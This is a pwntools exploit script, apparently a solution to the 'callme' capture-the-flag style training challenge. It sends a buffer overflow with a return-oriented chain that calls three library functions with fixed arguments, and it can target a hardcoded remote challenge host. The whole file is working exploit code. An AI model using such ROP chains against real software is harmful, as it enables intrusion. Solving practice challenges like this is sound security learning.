from pwn import *
from pwnlib.util.packing import p64

exe = ELF('./callme') # Adjust path if needed
context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('154.57.164.78', 30110)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *pwnme+88
continue
'''

io = start()
#-----Exploit-----

buff_padding = 40

arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

pop_rdi_rsi_rdx = 0x00000000040093c

callme_one = exe.symbols['callme_one']
callme_two = exe.symbols['callme_two']
callme_three = exe.symbols['callme_three']

payload = flat([

    buff_padding * b'A',

    pop_rdi_rsi_rdx,
    arg1, arg2, arg3,
    callme_one,

    pop_rdi_rsi_rdx,
    arg1, arg2, arg3,
    callme_two,

    pop_rdi_rsi_rdx, 
    arg1, arg2, arg3,
    callme_three

])

io.sendline(payload)
io.interactive()
